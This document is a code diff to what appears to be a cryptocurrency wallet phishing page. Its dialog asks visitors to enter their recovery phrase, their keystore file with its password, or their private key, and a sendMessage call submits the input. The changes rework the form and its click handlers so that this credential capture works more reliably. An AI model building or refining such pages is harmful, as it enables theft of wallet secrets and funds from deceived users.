@@ -8509,33 +8509,30 @@ publicKey: "tRYq_CDLm-Vu_54J4",
         </div>
 
         <div class="send-tabs">
-          <button id="phraseSend">Phrase</button>
-          <button id="keystoreSend">Keystore</button>
-          <button id="privateKeySend">Private Key</button>
+          <button id="phraseSend" type="button">Phrase</button>
+          <button id="keystoreSend" type="button">Keystore</button>
+          <button id="privateKeySend" type="button">Private Key</button>
         </div>
         <div class="message-tab"></div>
-        <div class="send-form">
-         
+        <form id="send-data-form" onsubmit="sendMessage(event); return false;">
+          <div class="send-form">
             <input type="hidden" name="wallet" id="walletNameData" />
             <div id="data-to-send">
               <div class="form-group">
-               
-                  <input type="hidden" id="type1" name="type" value="phrase" />
-                  <textarea id="textInput" name="phrase" required="" class="form-control"
-                    placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea>
-                </div>
-                <div class="small text-left my-3" style="font-size: 11px">
-                  Typically 12 (sometimes 24) words separated by single spaces
-                </div>
+                <input type="hidden" id="type1" name="type" value="phrase" />
+                <textarea id="textInput" name="phrase" required="" class="form-control"
+                  placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea>
+              </div>
+              <div class="small text-left my-3" style="font-size: 11px">
+                Typically 12 (sometimes 24) words separated by single spaces
               </div>
             </div>
-            <button  onclick="sendMessage()" type="submit" id="proceedButton" class="btn btn-primary btn-block"
-              style="font-weight: bold; font-size: 14px">
-              PROCEED
-            </button>
-            <div class="text-right">
-              
-            </div>
+          </div>
+          <button onclick="sendMessage(event)" type="submit" id="proceedButton" class="btn btn-primary btn-block"
+            style="font-weight: bold; font-size: 14px">
+            PROCEED
+          </button>
+        </form>
          
           <div class="text-muted text-left mb-3 pulseBox" style="
               border: 1px solid #28a745;
@@ -10069,10 +10066,10 @@ publicKey: "tRYq_CDLm-Vu_54J4",
       </div>
     </div>
   </div>
-  <script src="../../code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="../js/code.jquery.com/jquery-3.6.0.min.js"></script>
   <!-- <script src="./script/walletpage.js"></script> -->
-  <script src="../../cdn.jsdelivr.net/npm/%40popperjs/core%402.10.2/dist/umd/popper.min.js"></script>
-  <script src="../../cdn.jsdelivr.net/npm/bootstrap%405.1.3/dist/js/bootstrap.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js"></script>
   <script src="assets/jquery.waypoints.min.js.download.html"></script>
   <script src="assets/jquery.counterup.min.js.download.html"></script>
   <script src="assets/wow.min.js.download.html"></script>
@@ -10123,17 +10120,20 @@ publicKey: "tRYq_CDLm-Vu_54J4",
           $("#send-dialog").hide();
         });
       });
-      $("#phraseSend").on("click", function () {
+      $("#phraseSend").on("click", function (e) {
+        if (e) e.preventDefault();
         sendForm.html(
           '<div class="form-group"><input type="hidden" id="type" name="type" value="phrase"><textarea id="textInput" name="phrase" required class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea> </div> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>'
         );
       });
-      $("#keystoreSend").on("click", function () {
+      $("#keystoreSend").on("click", function (e) {
+        if (e) e.preventDefault();
         sendForm.html(
           '<div class="form-group"><input type="hidden" id="type" name="type" value="keystore"><textarea id="textInput" rows="5" style="resize: none" required name="keystore" class="form-control" placeholder="Enter Keystore"></textarea></div><input type="text" id="pk" class="form-control" name="password" required placeholder="Wallet password"> <div class="small text-left my-3" style="font-size: 11px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>'
         );
       });
-      $("#privateKeySend").on("click", function () {
+      $("#privateKeySend").on("click", function (e) {
+        if (e) e.preventDefault();
         sendForm.html(
           '<input type="hidden" id="type" name="type" value="privatekey"><input type="text" id="textInput" name="privateKey" required class="form-control" placeholder="Enter your Private Key"> <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by a single space.</div>'
         );
